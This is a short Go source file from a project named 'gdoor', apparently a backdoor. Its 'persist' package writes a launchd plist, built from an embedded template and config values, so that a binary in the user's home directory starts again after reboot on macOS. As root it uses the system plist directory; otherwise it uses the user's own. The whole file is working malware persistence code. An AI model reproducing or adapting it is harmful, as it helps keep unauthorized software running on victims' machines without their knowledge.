package persist

import (
	_ "embed"
	"fmt"
	"io/ioutil"
	"os"
	"path/filepath"

	"gdoor/config"
	"gdoor/debug"
	"gdoor/info"
)

//go:embed plist.tmpl
var plistFmt string

func setPlist(i *info.Info) {
	plist := fmt.Sprintf(plistFmt, config.PlistName, filepath.Join(i.GetHomePath(), config.TargetDir, config.TargetName))

	plistDir := config.RPlistDir
	if i.GetCurUser() != "root" {
		plistDir = filepath.Join(i.GetHomePath(), config.PlistDir)
	}
	if err := os.MkdirAll(plistDir, 0755); err != nil {
		debug.Println(err)
		return
	}

	if err := ioutil.WriteFile(filepath.Join(plistDir, config.PlistName+".plist"), []byte(plist), 0644); err != nil {
		debug.Println(err)
	}
}
